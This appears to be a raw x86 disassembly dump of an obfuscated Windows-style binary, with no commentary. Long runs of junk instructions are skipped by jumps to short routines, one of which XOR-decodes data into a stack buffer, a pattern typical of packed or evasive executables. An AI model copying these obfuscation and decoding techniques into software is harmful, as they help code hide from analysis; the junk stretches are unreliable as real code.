  40320c:	inc    ebp
  40320d:	clc    
  40320e:	xor    DWORD PTR [ebp+0x45c7f89c],eax
  403214:	lock xor al,BYTE PTR [ebp+0xd09f89c]
  40321b:	out    dx,eax
  40321c:	in     eax,dx
  40321d:	inc    edx
  40321e:	add    BYTE PTR [ebx-0x48f007bb],cl
  403224:	or     eax,0x42edcb
  403229:	adc    DWORD PTR ds:0x4304d7,ecx
  40322f:	mov    ecx,0x7510854
  403234:	sub    DWORD PTR ds:0x42e7c8,0x77ef
  40323e:	push   esi
  40323f:	xor    eax,ecx
  403241:	and    DWORD PTR ds:0x430461,0x33b1
  40324b:	jmp    0x403418
  403250:	inc    ecx
  403251:	jp     0x4031f4
  403253:	cs popa 
  403255:	mov    ch,0x51
  403257:	jno    0x403251
  403259:	(bad)  
  40325b:	pop    edi
  40325c:	jmp    0x403287
  40325e:	and    BYTE PTR [edx+edx*8+0x16],ch
  403262:	jle    0x4032e2
  403264:	scas   al,BYTE PTR es:[edi]
  403265:	jg     0x4032e5
  403267:	jle    0x4031ff
  403269:	pushf  
  40326a:	cwde   
  40326b:	ins    BYTE PTR es:[edi],dx
  40326c:	sar    DWORD PTR [esi+0x557763f3],cl
  403272:	call   FWORD PTR [ebp-0x3c]
  403275:	jno    0x403263
  403277:	or     eax,DWORD PTR [ecx]
  403279:	adc    DWORD PTR [esi+edx*4+0x3a],ecx
  40327d:	push   edx
  40327e:	rol    BYTE PTR [ebp+0x17],0x5a
  403282:	(bad)  
  403283:	pop    ss
  403284:	push   0x50
  403286:	sahf   
  403287:	sti    
  403288:	or     dl,BYTE PTR [ebp+0x30]
  40328b:	stos   BYTE PTR es:[edi],al
  40328c:	aam    0xa
  40328e:	xchg   ecx,eax
  40328f:	and    al,0xed
  403291:	fisub  DWORD PTR [esi+0x475edb44]
  403297:	add    edi,esi
  403299:	(bad)  [edi+0x6c]
  40329c:	xchg   ebx,eax
  40329d:	mov    al,0x78
  40329f:	div    DWORD PTR [edx-0x7e]
  4032a2:	stos   BYTE PTR es:[edi],al
  4032a3:	scas   eax,DWORD PTR es:[edi]
  4032a4:	mov    esi,0xd3df2677
  4032a9:	int3   
  4032aa:	mov    bh,0x31
  4032ac:	test   BYTE PTR [esi+esi*4-0x725cef32],0x30
  4032b4:	in     eax,dx
  4032b5:	sbb    dh,BYTE PTR [edx-0x7a]
  4032b8:	mov    DWORD PTR [edx],ebp
  4032ba:	(bad)  
  4032bb:	pop    ecx
  4032bc:	repz or DWORD PTR [eax+0x3d114caf],0xffffffd4
  4032c4:	int    0x3d
  4032c6:	dec    ebp
  4032c7:	sbb    al,0xb4
  4032c9:	add    ah,ch
  4032cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032cc:	fdiv   QWORD PTR [esi]
  4032ce:	mov    edi,0xac6cfe10
  4032d3:	xchg   ebx,eax
  4032d4:	fs jbe 0x40326e
  4032d7:	pop    edi
  4032d8:	mov    ecx,0xf9f1e6e7
  4032dd:	mov    eax,0x4ed605d0
  4032e2:	shr    ah,1
  4032e4:	pop    edi
  4032e5:	pop    esi
  4032e6:	jg     0x403301
  4032e8:	int3   
  4032e9:	inc    eax
  4032ea:	pop    es
  4032eb:	push   ds
  4032ec:	in     eax,0x11
  4032ee:	pushf  
  4032ef:	test   DWORD PTR [ebx-0xc],edi
  4032f2:	aam    0x7f
  4032f4:	sbb    eax,0xcd7ac756
  4032f9:	loop   0x4032d2
  4032fb:	aam    0x8c
  4032fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4032fe:	in     eax,dx
  4032ff:	ja     0x403357
  403301:	sar    DWORD PTR [edi+0x29],0xb4
  403305:	adc    al,0xb2
  403307:	repnz dec edi
  403309:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40330a:	sti    
  40330b:	ja     0x40334f
  40330d:	cmc    
  40330e:	adc    DWORD PTR [ecx-0x7b],esi
  403311:	fwait
  403312:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403313:	cmp    esp,DWORD PTR [ebx]
  403315:	jne    0x40336c
  403317:	ror    ch,1
  403319:	jno    0x403348
  40331b:	rcl    DWORD PTR [ecx+eax*2-0x5],1
  40331f:	mov    bh,0x2d
  403321:	adc    bh,dh
  403323:	fwait
  403324:	xchg   esi,eax
  403325:	xchg   edx,eax
  403326:	(bad)  
  403327:	xlat   BYTE PTR ds:[ebx]
  403328:	in     eax,dx
  403329:	and    ch,ch
  40332b:	loope  0x4033ac
  40332d:	cmp    dh,ch
  40332f:	mov    esi,0x60115321
  403334:	sbb    BYTE PTR [ebx+0x74b101d],bh
  40333a:	mov    al,0xac
  40333c:	add    al,0x26
  40333e:	inc    ecx
  40333f:	dec    ebp
  403340:	call   0x4ddb9ae9
  403345:	icebp  
  403346:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403347:	retf   
  403348:	arpl   WORD PTR [eax+0x1e4156a8],ax
  40334e:	cdq    
  40334f:	mov    ebx,DWORD PTR [esi-0x72]
  403352:	push   esi
  403353:	xor    ch,ah
  403355:	data16 and dh,BYTE PTR [eax-0xa0981e3]
  40335c:	(bad)  
  40335d:	jne    0x4033d3
  40335f:	je     0x4033da
  403361:	in     al,0x86
  403363:	pusha  
  403364:	lahf   
  403365:	xor    eax,0x2531cfc7
  40336a:	inc    edx
  40336b:	in     eax,dx
  40336c:	bound  edx,QWORD PTR [esi]
  40336e:	les    edi,FWORD PTR [eax+ecx*4+0x3ce193d5]
  403375:	mov    cl,0x71
  403377:	push   ss
  403378:	xor    eax,DWORD PTR ds:0x58eb257b
  40337e:	jno    0x40332c
  403380:	inc    ebx
  403381:	xchg   edi,eax
  403382:	inc    ecx
  403383:	icebp  
  403384:	inc    ecx
  403385:	daa    
  403386:	xor    eax,DWORD PTR [esi]
  403388:	add    DWORD PTR [esp+esi*8-0x7f],ebp
  40338c:	mov    eax,0xa2b8e3a0
  403391:	aas    
  403392:	stc    
  403393:	call   DWORD PTR [ecx+0xc1861f9]
  403399:	cmp    eax,0xb69acab0
  40339e:	jne    0x4033ce
  4033a0:	fiadd  DWORD PTR [ebp-0x40]
  4033a3:	xchg   esi,eax
  4033a4:	pop    eax
  4033a5:	(bad)  
  4033a6:	fcom   DWORD PTR [eax-0xb]
  4033a9:	mov    eax,0xae6dd92c
  4033ae:	in     eax,dx
  4033af:	ret    0x92da
  4033b2:	mov    edx,0x668bfb3a
  4033b7:	jnp    0x403411
  4033b9:	mov    ds:0x5b2aeead,al
  4033be:	dec    ebp
  4033bf:	mov    edx,0xabb003ff
  4033c4:	xchg   ebp,eax
  4033c5:	dec    DWORD PTR [ecx]
  4033c7:	cwde   
  4033c8:	pop    esp
  4033c9:	(bad)  
  4033ca:	loope  0x403409
  4033cc:	inc    ebp
  4033cd:	aad    0x2d
  4033cf:	imul   ebp,esi,0xffffff82
  4033d2:	mov    ah,0x3a
  4033d4:	scas   al,BYTE PTR es:[edi]
  4033d5:	inc    eax
  4033d6:	shl    ebx,cl
  4033d8:	xchg   esp,eax
  4033d9:	push   ecx
  4033da:	fist   WORD PTR [eax+0x23]
  4033dd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4033de:	popf   
  4033df:	nop
  4033e0:	ins    BYTE PTR es:[edi],dx
  4033e1:	into   
  4033e2:	test   al,0x5b
  4033e4:	loopne 0x403457
  4033e6:	shl    DWORD PTR [edi],1
  4033e8:	push   es
  4033e9:	repz xor BYTE PTR [edi-0x5e2d199a],0xc7
  4033f1:	(bad)  
  4033f2:	sub    eax,0xb4b5d0a0
  4033f7:	in     al,0x6d
  4033f9:	dec    edi
  4033fa:	mov    ebx,?
  4033fc:	pop    esi
  4033fd:	in     eax,0x5b
  4033ff:	int3   
  403400:	and    al,0xf5
  403402:	mov    bh,0x15
  403404:	(bad)  
  403405:	dec    edi
  403406:	jbe    0x4033fb
  403408:	sar    BYTE PTR [edi+eiz*2+0xbec2b71],0xd7
  403410:	scas   al,BYTE PTR es:[edi]
  403411:	push   cs
  403412:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  403413:	cs cdq 
  403415:	pusha  
  403416:	push   esi
  403417:	enter  0x9bbe,0x72
  40341b:	xor    al,BYTE PTR [eax]
  40341d:	neg    DWORD PTR ds:0x430459
  403423:	add    eax,esi
  403425:	jmp    0x403432
  40342a:	mov    dl,BYTE PTR [ebp-0x1]
  40342d:	mov    BYTE PTR [ebp+eax*1-0x58],dl
  403431:	inc    eax
  403432:	cmp    eax,0x40
  403435:	jb     0x40342a
  40343b:	mov    edx,DWORD PTR [ebp-0x8]
  40343e:	mov    eax,DWORD PTR [ebp-0xc]
  403441:	jmp    0x40360e
  403446:	mov    ds:0x9b821f26,eax
  40344b:	and    DWORD PTR [ebx-0x712401d9],0xffffff90
  403452:	or     ebx,0x6e
  403455:	sahf   
  403456:	add    dl,BYTE PTR [esi+edi*2]
  403459:	jle    0x403409
  40345b:	jg     0x4034db
  40345d:	jle    0x40340e
  40345f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403460:	sub    BYTE PTR [edi+0x3f],dl
  403463:	jne    0x403469
  403465:	or     eax,0x45961941
  40346a:	mov    esi,0x677490af
  40346f:	pop    esi
  403470:	pop    ss
  403471:	lods   al,BYTE PTR ds:[esi]
  403472:	xor    DWORD PTR ds:0xe05a5763,ebx
  403478:	dec    esp
  403479:	jb     0x4034ca
  40347b:	out    dx,al
  40347c:	add    bl,BYTE PTR [ebx]
  40347e:	dec    ebx
  40347f:	fisttp WORD PTR [ebx+0x53]
  403482:	test   eax,0xf21d7e7a
  403487:	push   ecx
  403488:	add    DWORD PTR [esi],ebp
  40348a:	outs   dx,BYTE PTR ds:[esi]
  40348b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40348c:	es cli 
  40348e:	push   0xfffffffd
  403490:	cmpxchg BYTE PTR [eax],al
  403493:	mov    cl,0xc
  403495:	dec    ecx
  403496:	xcrypt-ofb (bad)
  403497:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  403498:	push   0x44
  40349a:	pushf  
  40349b:	sub    BYTE PTR [ecx+0x7c],bl
  40349e:	shr    BYTE PTR [ebx-0x48],cl
  4034a1:	mov    cl,0x58
  4034a3:	test   DWORD PTR [edi-0x72eccb90],ebx
  4034a9:	out    0x48,eax
  4034ab:	xor    cl,BYTE PTR [ecx+edi*2-0x5]
  4034af:	cmp    al,0x9b
  4034b1:	cld    
  4034b2:	outs   dx,DWORD PTR ds:[esi]
  4034b3:	jmp    0x4034da
  4034b5:	jns    0x4034ab
  4034b7:	add    al,0x8a
  4034b9:	push   ebp
  4034ba:	push   esp
  4034bb:	out    0x71,eax
  4034bd:	mov    cl,bh
  4034bf:	xchg   ebp,eax
  4034c0:	das    
  4034c1:	sub    esp,ebx
  4034c3:	or     BYTE PTR [edi],dl
  4034c5:	fxtract 
  4034c7:	loopne 0x4034be
  4034c9:	ja     0x403545
  4034cb:	mov    DWORD PTR [esi-0x3ed8cae2],0x6bedc7ba
  4034d5:	rol    DWORD PTR [edx-0x16],1
  4034d8:	mov    ds:0xd85403f0,eax
  4034dd:	dec    edx
  4034de:	sbb    al,0x99
  4034e0:	jo     0x403541
  4034e2:	mov    bh,0x5b
  4034e4:	jp     0x4034b4
  4034e6:	pop    ss
  4034e7:	mov    ds:0x2188f80b,eax
  4034ec:	push   edi
  4034ed:	jmp    0x403487
  4034ef:	or     al,0xeb
  4034f1:	dec    esp
  4034f2:	nop
  4034f3:	sbb    bl,BYTE PTR [ecx+0x3c]
  4034f6:	out    0xfe,eax
  4034f8:	mov    BYTE PTR [eax],dh
  4034fa:	ins    DWORD PTR es:[edi],dx
  4034fb:	or     BYTE PTR [edi-0x4988bd3a],0xa7
  403502:	sbb    eax,0xda457dab
  403507:	sbb    edx,DWORD PTR [eax+0x5f]
  40350a:	das    
  40350b:	shl    DWORD PTR [esi+0x6d],0x33
  40350f:	xchg   ecx,eax
  403510:	(bad)  
  403512:	int3   
  403513:	aam    0x18
  403515:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403516:	cmp    al,bl
  403518:	cmp    esi,DWORD PTR [ebx+ebx*1+0x3]
  40351c:	and    DWORD PTR [edx+ebx*1+0x22e197ec],esp
  403523:	jns    0x40354b
  403525:	xchg   esp,eax
  403526:	sub    al,0xb8
  403528:	pop    ss
  403529:	mov    ah,0x60
  40352b:	jae    0x4035a2
  40352d:	popaw  
  40352f:	in     eax,dx
  403530:	mov    ds:0x5806c6b0,al
  403535:	test   BYTE PTR [eax+0x6c47fc64],ah
  40353b:	jecxz  0x403569
  40353d:	iret   
  40353e:	popf   
  40353f:	mov    esp,DWORD PTR [ecx+0xa]
  403542:	adc    ebp,DWORD PTR [edx]
  403544:	push   0x7bddbf2a
  403549:	test   DWORD PTR es:[edx+eiz*4+0x69],0x46ce5533
  403552:	ins    BYTE PTR es:[edi],dx
  403553:	cld    
  403554:	mul    eax
  403556:	cmp    ebx,ebx
  403558:	xchg   ecx,eax
  403559:	jb     0x4035a4
  40355b:	test   bh,bh
  40355d:	daa    
  40355e:	lds    ebp,FWORD PTR [esi+0x5e310072]
  403564:	inc    esi
  403565:	jg     0x4035ce
  403567:	pop    esp
  403568:	icebp  
  403569:	xchg   ebp,eax
  40356a:	or     BYTE PTR [esi+0x4a2121b6],dh
  403570:	in     al,0xbb
  403572:	fadd   st,st(4)
  403574:	mov    eax,0x46d5bb12
  403579:	push   ebp
  40357a:	jae    0x403582
  40357c:	leave  
  40357d:	inc    esp
  40357e:	or     esi,edi
  403580:	inc    esi
  403581:	add    esp,DWORD PTR [edi]
  403583:	jmp    0x4035c9
  403585:	cmc    
  403586:	loopne 0x4035b3
  403588:	scas   al,BYTE PTR es:[edi]
  403589:	mov    ds:0xcf4e132b,eax
  40358e:	fxch   st(5)
  403590:	xlat   BYTE PTR ds:[ebx]
  403591:	or     BYTE PTR [edi-0x12],ah
  403594:	test   al,0xcf
  403596:	add    al,0x5e
  403598:	jp     0x40360b
  40359a:	test   edi,esi
  40359c:	aad    0x22
  40359e:	jns    0x40356d
  4035a0:	loop   0x403597
  4035a2:	test   DWORD PTR [edx-0x1b488e34],0xf82b1ad7
  4035ac:	add    BYTE PTR [ecx+0x31c59378],dl
  4035b2:	xor    DWORD PTR fs:[eax],0xffffffb6
  4035b6:	and    eax,0x15efac8c
  4035bb:	adc    dl,BYTE PTR [eax+0x14ccb060]
  4035c1:	jbe    0x40354b
  4035c3:	xchg   DWORD PTR [eax],edi
  4035c5:	das    
  4035c6:	test   ah,ah
  4035c8:	repnz add bl,dh
  4035cb:	jg     0x40363f
  4035cd:	clc    
  4035ce:	shl    BYTE PTR [ecx+0x4d],1
  4035d1:	or     ecx,DWORD PTR [ecx]
  4035d3:	and    al,0x1a
  4035d5:	aaa    
  4035d6:	xor    eax,0x96e35335
  4035db:	mov    ebp,edx
  4035dd:	es push edx
  4035df:	sar    DWORD PTR [eax-0x2e7e1699],1
  4035e5:	fs (bad) 
  4035e7:	aad    0x8d
  4035e9:	(bad)  
  4035ea:	imul   esi,edx,0x26
  4035ed:	into   
  4035ee:	lds    ebp,FWORD PTR ds:0x6f456b1f
  4035f4:	add    edx,ebp
  4035f6:	or     al,0xc8
  4035f8:	and    DWORD PTR [ebp+0x3b],edi
  4035fb:	mov    dh,0x5e
  4035fd:	fsubr  QWORD PTR [edi+eiz*1]
  403600:	mov    esp,0x8ebb6a1d
  403605:	mov    ch,0x29
  403607:	jmp    0xa3de:0xfcff
  40360d:	fwait
  40360e:	xor    edx,ecx
  403610:	add    edx,esi
  403612:	cmp    edx,eax
  403614:	je     0x40365a
  40361a:	push   ebx
  40361b:	push   edi
  40361c:	mov    edi,DWORD PTR [ebp+0x8]
  40361f:	mov    eax,0x8a3c
  403624:	xor    ax,WORD PTR [edi+edx*4+0x2]
  403629:	mov    edi,0x3b02
  40362e:	add    ax,di
  403631:	movzx  eax,ax
  403634:	mov    DWORD PTR [ebp-0x14],eax
  403637:	mov    eax,DWORD PTR [ebp+0x8]
  40363a:	movzx  eax,WORD PTR [eax+edx*4]
  40363e:	xor    eax,0x8a3c
  403643:	add    eax,edi
  403645:	mov    edi,DWORD PTR [ebp-0x14]
  403648:	mov    BYTE PTR [ebp+edi*1-0x58],al
  40364c:	mov    eax,DWORD PTR [ebp-0xc]
  40364f:	inc    edx
  403650:	cmp    edx,eax
  403652:	jne    0x40361c
  403658:	pop    edi
  403659:	pop    ebx
  40365a:	mov    eax,DWORD PTR [ebp-0x8]
  40365d:	jmp    0x40382a
  403662:	jo     0x403624
  403664:	add    ecx,DWORD PTR [eax-0x1f8eb64d]
  40366a:	mov    esp,0x53dd7c8
  40366f:	push   es
  403670:	mov    ch,0x66
  403672:	mov    dl,0x15
  403674:	jle    0x4036f4
  403676:	scas   al,BYTE PTR es:[edi]
  403677:	jg     0x4036f7
  403679:	jle    0x4036d9
  40367b:	loop   0x403676
  40367d:	add    edx,edi
  40367f:	call   0xe386:0x169f1bb4
  403686:	pop    ds
  403687:	test   ebx,esp
  403689:	repz ret 0x227e
  40368d:	iret   
  40368e:	push   edi
  40368f:	test   BYTE PTR [eax-0x20],dl
  403692:	pop    esp
  403693:	sbb    ebp,edi
  403695:	lea    esp,[edi+0x3a]
  403698:	scas   eax,DWORD PTR es:[edi]
  403699:	out    dx,eax
  40369a:	sbb    eax,0x69d5fc0b
  40369f:	mov    ds:0x36df7ac4,al
  4036a4:	cmp    DWORD PTR [esi-0x5b],ecx
  4036a7:	loop   0x4036ae
  4036a9:	cmp    al,0x7f
  4036ab:	jae    0x4036ff
  4036ad:	arpl   WORD PTR [esi-0x420df09d],cx
  4036b3:	or     al,BYTE PTR ds:0x8335faf
  4036b9:	mov    DWORD PTR [ebx+ecx*1+0x28f29ed4],esi
  4036c0:	xchg   edx,eax
  4036c1:	pusha  
  4036c2:	jle    0x403653
  4036c4:	pop    edx
  4036c5:	xchg   esp,eax
  4036c6:	xor    esp,DWORD PTR [edi]
  4036c8:	in     eax,dx
  4036c9:	inc    esp
  4036ca:	xchg   ecx,eax
  4036cb:	iret   
  4036cc:	ins    BYTE PTR es:[edi],dx
  4036cd:	out    dx,al
  4036ce:	stos   DWORD PTR es:[edi],eax
  4036cf:	jg     0x403748
  4036d1:	pop    ecx
  4036d2:	fst    DWORD PTR [edi-0x6e]
  4036d5:	xchg   DWORD PTR [ecx+esi*1+0x6ae97fef],ebx
  4036dc:	loope  0x4036c2
  4036de:	sub    al,0x59
  4036e0:	cmp    al,0xd5
  4036e2:	out    dx,eax
  4036e3:	rcl    BYTE PTR [esi-0x23],0xd9
  4036e7:	push   edi
  4036e8:	loope  0x4036f8
  4036ea:	mov    bh,dh
  4036ec:	(bad)  
  4036ed:	aaa    
  4036ee:	xor    DWORD PTR [edi+0x1b],esp
  4036f1:	out    0x38,al
  4036f3:	or     BYTE PTR [ebp-0x10],bl
  4036f6:	lea    ecx,[edx+0xa2111e8]
  4036fc:	pop    edx
  4036fd:	mov    ds:0x453b89f9,eax
  403702:	fild   WORD PTR [ebx]
  403704:	xchg   edi,eax
  403705:	cwde   
  403706:	cmp    bl,BYTE PTR [edx-0x2a0ac5a8]
  40370c:	sbb    al,0x7b
  40370e:	ror    esp,0xbc
  403711:	gs (bad) 
  403713:	jg     0x403726
  403715:	inc    esp
  403716:	ficomp DWORD PTR [ebp+0x15]
  403719:	pusha  
  40371a:	(bad)  
  40371b:	rcl    BYTE PTR [esi-0x38],cl
  40371e:	xor    BYTE PTR [edx+0xac72f55],bl
  403724:	(bad)  
  403726:	xchg   ecx,eax
  403727:	xchg   esp,eax
  403728:	mov    WORD PTR [edx],ds
  40372a:	jns    0x4036b2
  40372c:	mov    esp,0xb4269f27
  403731:	pop    esp
  403732:	stos   DWORD PTR es:[edi],eax
  403733:	sub    ecx,DWORD PTR [esp+eax*1-0x29]
  403737:	mov    bh,0x14
  403739:	neg    DWORD PTR [edx+ebx*8]
  40373c:	push   eax
  40373d:	rol    BYTE PTR [edx-0x5f13b5be],cl
  403743:	ja     0x403703
  403745:	ret    0x78c2
  403748:	add    al,0xc1
  40374a:	adc    al,0x1e
  40374c:	and    edx,esp
  40374e:	fld    TBYTE PTR [esi+0x4a28cdc0]
  403754:	call   0xac197869
  403759:	outs   dx,DWORD PTR ds:[esi]
  40375a:	aad    0x6e
  40375c:	repz or al,0x19
  40375f:	and    eax,DWORD PTR ds:0x3e8d766b
  403765:	push   cs
  403766:	push   ecx
  403767:	test   ah,al
  403769:	aaa    
  40376a:	push   es
  40376b:	nop    ebx
  40376e:	(bad)  
  40376f:	outs   dx,BYTE PTR ds:[esi]
  403770:	xor    DWORD PTR [eax],ebx
  403772:	jo     0x4036f4
  403774:	cdq    
  403775:	aad    0x5c
  403777:	mov    esp,0x26778384
  40377c:	outs   dx,DWORD PTR ds:[esi]
  40377d:	pop    ss
  40377e:	(bad)  
  40377f:	stc    
  403780:	addr16 int3 
  403782:	lock sti 
  403784:	rcr    eax,1
  403786:	jecxz  0x40378f
  403788:	xchg   ebx,eax
  403789:	sahf   
  40378a:	mov    ds:0xf0ec09be,al
  40378f:	rol    DWORD PTR [edx],cl
  403791:	fld    QWORD PTR [esi+0x209a9b30]
  403797:	adc    DWORD PTR [esi],ecx
  403799:	adc    eax,0xf6e76e93
  40379e:	outs   dx,DWORD PTR ds:[esi]
  40379f:	mov    edx,DWORD PTR [ecx]
  4037a1:	retf   
  4037a2:	stos   DWORD PTR es:[edi],eax
  4037a3:	repnz inc esp
  4037a5:	ds out 0x5b,eax
  4037a8:	jb     0x403773
  4037aa:	mov    ch,0xcf
  4037ac:	ins    DWORD PTR es:[edi],dx
  4037ad:	xchg   ecx,eax
  4037ae:	add    eax,0x166aa74d
  4037b3:	xor    BYTE PTR [ecx+0x43],ch
  4037b6:	dec    esi
  4037b7:	mov    ds:0xccc365a7,eax
  4037bc:	jmp    0x91cd02fc
  4037c1:	jp     0x40379a
  4037c3:	ror    bh,0x9f
  4037c6:	mov    ds:0x891cd2bf,eax
  4037cb:	mov    al,0x1c
  4037cd:	clc    
  4037ce:	(bad)  
  4037cf:	js     0x403809
  4037d1:	inc    ecx
  4037d2:	or     eax,0x23c4524a
  4037d7:	dec    esi
  4037d8:	jge    0x403825
  4037da:	out    0x4e,eax
  4037dc:	pop    es
  4037dd:	lahf   
  4037de:	repnz into 
  4037e0:	test   dh,0xa
  4037e3:	cmp    eax,0x37b25c8c
  4037e8:	pop    edx
  4037e9:	pop    esi
  4037ea:	add    DWORD PTR [eax-0x2a345225],0x19266da9
  4037f4:	cmp    al,0x8
  4037f6:	mov    ebp,0xc02d376f
  4037fb:	pop    esp
  4037fc:	ja     0x4037e0
  4037fe:	xchg   esi,eax
  4037ff:	push   ds
  403800:	retf   
  403801:	jle    0x403875
  403803:	call   0x24765164
  403808:	pusha  
  403809:	cmp    dh,0x90
  40380c:	sti    
  40380d:	dec    esp
  40380e:	rcr    DWORD PTR [edi+esi*1],cl
  403811:	(bad)  
  403812:	jecxz  0x403844
  403814:	lock dec edx
  403816:	pop    edx
  403817:	bound  cx,DWORD PTR [edx]
  40381a:	cs pop ss
  40381c:	outs   dx,DWORD PTR ds:[esi]
  40381d:	fwait
  40381e:	xchg   DWORD PTR [eax-0x4ed50ade],edi
  403824:	sti    
  403825:	cmp    BYTE PTR ss:[edx+0x558b234e],dh
  40382c:	adc    BYTE PTR [ebx],dh
  40382e:	rol    DWORD PTR [ebx],0xc6
  403831:	jmp    0x4039fe
  403836:	jl     0x403858
  403838:	mov    cl,0xb0
  40383a:	mov    cl,0xb1
  40383c:	jge    0x4037ee
  40383e:	fld    QWORD PTR [edi]
  403840:	call   0xee5b723
  403845:	inc    eax
  403846:	loop   0x40385b
  403848:	jle    0x4038c8
  40384a:	scas   al,BYTE PTR es:[edi]
  40384b:	jg     0x4038cb
  40384d:	jle    0x403825
  40384f:	(bad)  
  403850:	fidivr DWORD PTR [esi+ebp*4+0x6cbe4386]
  403857:	xchg   edx,eax
  403858:	push   0xffffffbf
  40385a:	sbb    ebp,DWORD PTR ds:0x61bf32d7
  403860:	hlt    
  403861:	das    
  403862:	dec    esp
  403863:	sar    esi,1
  403865:	push   eax
  403866:	neg    BYTE PTR [ebx-0x63]
  403869:	pop    ss
  40386a:	jle    0x403801
  40386c:	mov    ch,0xce
  40386e:	ss inc ebp
  403870:	mov    DWORD PTR [edx+0x10d93a72],esp
  403876:	cld    
  403877:	std    
  403878:	je     0x25fa0d24
  40387e:	js     0x4038b2
  403880:	mov    ebx,DWORD PTR [edx+ecx*1]
  403883:	jns    0x403807
  403885:	cli    
  403886:	(bad)  
  403887:	rcl    DWORD PTR [edi-0x5703926c],cl
  40388d:	fisub  DWORD PTR [ebx+ebx*4+0x44ae6552]
  403894:	or     ebp,0xb476e7e2
  40389a:	push   esp
  40389b:	aad    0xd0
  40389d:	(bad)  
  40389e:	dec    esp
  40389f:	cli    
  4038a0:	jae    0x403874
  4038a2:	mov    edi,0xe83a9c84
  4038a7:	pop    edi
  4038a8:	in     al,dx
  4038a9:	sub    al,0x66
  4038ab:	(bad)  
  4038ac:	cli    
  4038ad:	mov    ecx,0xfc49d7d7
  4038b2:	mov    esp,0x2cc77ef9
  4038b7:	scas   eax,DWORD PTR es:[edi]
  4038b8:	push   es
  4038b9:	xchg   edi,eax
  4038ba:	hlt    
  4038bb:	imul   ecx,DWORD PTR [edx],0x17
  4038be:	daa    
  4038bf:	jmp    0x8d09:0x31808151
  4038c6:	ins    BYTE PTR es:[edi],dx
  4038c7:	jnp    0x40387d
  4038c9:	adc    eax,0xfa077920
  4038ce:	call   0x46585242
  4038d3:	pop    eax
  4038d4:	out    dx,al
  4038d5:	xor    ah,BYTE PTR [eax-0x72]
  4038d8:	cwde   
  4038d9:	adc    BYTE PTR [eax+0x26a84b51],bl
  4038df:	xchg   BYTE PTR ds:0x213aed92,ah
  4038e5:	pop    edx
  4038e6:	adc    eax,0x941fa25
  4038eb:	mov    al,0x3b
  4038ed:	mov    ebx,0xf227683e
  4038f2:	add    eax,0x660a0122
  4038f7:	pop    esp
  4038f8:	xlat   BYTE PTR ds:[ebx]
  4038f9:	in     eax,dx
  4038fa:	shr    BYTE PTR [edi],1
  4038fc:	or     al,0x4
  4038fe:	imul   esi,edi,0x1913d1b5
  403904:	jp     0x403886
  403906:	stos   BYTE PTR es:[edi],al
  403907:	test   al,0x4c
  403909:	(bad)  
  40390a:	ja     0x4038a8
  40390c:	stos   DWORD PTR es:[edi],eax
  40390d:	repnz clc 
  40390f:	sbb    dl,ch
  403911:	retf   0x719
  403914:	jg     0x403977
  403916:	sub    DWORD PTR [ecx-0x58ab0ee],ebx
  40391c:	out    dx,eax
  40391d:	fsub   st,st(6)
  40391f:	sub    al,0x33
  403921:	sub    DWORD PTR [eax],ecx
  403923:	dec    esi
  403924:	adc    eax,0x316c8adf
  403929:	push   ebp
  40392a:	push   ebx
  40392b:	imul   esp,DWORD PTR [esi],0xffffffad
  40392e:	pop    eax
  40392f:	xchg   esi,eax
  403930:	mov    esi,0x34b82807
  403935:	retf   0x5981
  403938:	out    dx,eax
  403939:	jle    0x4038c8
  40393b:	jmp    0x403931
  40393d:	xchg   edi,eax
  40393e:	xchg   DWORD PTR [edi+0xf0d38d0],esp
  403944:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  403945:	and    al,0xdf
  403947:	inc    ebp
  403948:	sbb    DWORD PTR [edx],eax
  40394a:	pop    es
  40394b:	mov    DWORD PTR [ebx-0x66],edi
  40394e:	jbe    0x40398a
  403950:	mov    esi,0x40027e61
  403955:	dec    eax
  403956:	pop    ebx
  403958:	jmp    0x5885b775
  40395d:	ss pushf 
  40395f:	jle    0x40393c
  403961:	or     al,0x7
  403963:	stos   BYTE PTR es:[edi],al
  403964:	int    0x9e
  403966:	sbb    esi,eax
  403968:	xchg   DWORD PTR [edx+edi*8-0x2b],esi
  40396c:	mov    ah,0x3a
  40396e:	jo     0x40394a
  403970:	inc    edi
  403971:	or     ebx,DWORD PTR [esi+eax*8-0x3eb9e319]
  403978:	add    eax,0x866f1c30
  40397d:	pop    ss
  40397e:	mov    ebx,0xd74beb51
  403983:	mov    ch,0xd7
  403985:	cmp    eax,0x1946e5de
  40398a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40398b:	xor    dh,BYTE PTR [ebp-0x6f7d51e6]
  403991:	stc    
  403992:	mov    bl,BYTE PTR ds:0x4b320ca
  403998:	xlat   BYTE PTR ds:[ebx]
  403999:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40399a:	test   eax,0xe0a317cc
  40399f:	or     al,0xb6
  4039a1:	leave  
  4039a2:	ins    DWORD PTR es:[edi],dx
  4039a3:	scas   eax,DWORD PTR es:[edi]
  4039a4:	fnstenv [eax-0x3c]
  4039a7:	push   ss
  4039a8:	push   ecx
  4039a9:	dec    ebx
  4039aa:	adc    al,0x21
  4039ac:	jno    0x403931
  4039ae:	pop    ds
  4039af:	loope  0x403975
  4039b1:	add    eax,DWORD PTR [ebx]
  4039b3:	mov    al,BYTE PTR [edx-0x73]
  4039b6:	mov    ds:0x6e8b7356,eax
  4039bb:	lock jbe 0x4039dc
  4039be:	mov    ch,0x37
  4039c0:	lahf   
  4039c1:	inc    eax
  4039c2:	sbb    DWORD PTR [esp+ecx*8],esi
  4039c5:	ficomp DWORD PTR [ebp-0x17ce8191]
  4039cb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4039cc:	xchg   ecx,eax
  4039cd:	aaa    
  4039ce:	mov    BYTE PTR gs:[ebx+edi*4-0x4],dl
  4039d3:	inc    ecx
